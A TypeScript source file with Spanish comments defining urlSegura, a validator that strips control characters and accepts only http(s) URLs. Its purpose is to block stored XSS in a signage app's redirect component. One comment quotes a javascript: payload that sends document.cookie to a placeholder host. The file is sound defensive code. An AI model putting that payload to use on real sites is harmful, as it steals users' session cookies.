// Valida que una URL cargada por un humano (admin, cliente del portal, o
// comprador de una pieza autogestionada) sea segura antes de guardarla.
//
// Dos cosas distintas, las dos necesarias:
//
// 1. Que esté bien formada — evita que un typo quede pegado en un cartel
//    NFC/QR ya impreso hasta que alguien lo note.
//
// 2. Que el esquema sea http(s) — esto NO es cosmético. `new URL()` parsea
//    feliz "javascript:fetch('https://malo/'+document.cookie)", y ese valor
//    termina en `location.replace()` y en un <a href> dentro de
//    components/tap/RedireccionSuave.tsx. Sin este filtro, cualquiera que
//    pueda editar el destino de una pieza (el dueño de un cartel comprado en
//    Mercado Libre, con solo su PIN) logra ejecutar JavaScript en
//    app.metricsfield.com — el MISMO origen donde vive la cookie de sesión
//    de /admin. Es XSS almacenado con robo de sesión del panel.
//
// Por eso la lista es blanca (solo lo explícitamente permitido) y no negra:
// además de javascript:, deja afuera data:, vbscript:, file: y cualquier
// esquema raro que aparezca en el futuro.
const ESQUEMAS_PERMITIDOS = new Set(["http:", "https:"]);

export function urlSegura(url: string): string | null {
  // eslint-disable-next-line no-control-regex
  const limpia = url.replace(/[\x00-\x1f\x7f]/g, "").trim();
  if (!limpia) return null;
  try {
    const parsed = new URL(limpia);
    if (!ESQUEMAS_PERMITIDOS.has(parsed.protocol)) return null;
    return limpia;
  } catch {
    return null;
  }
}
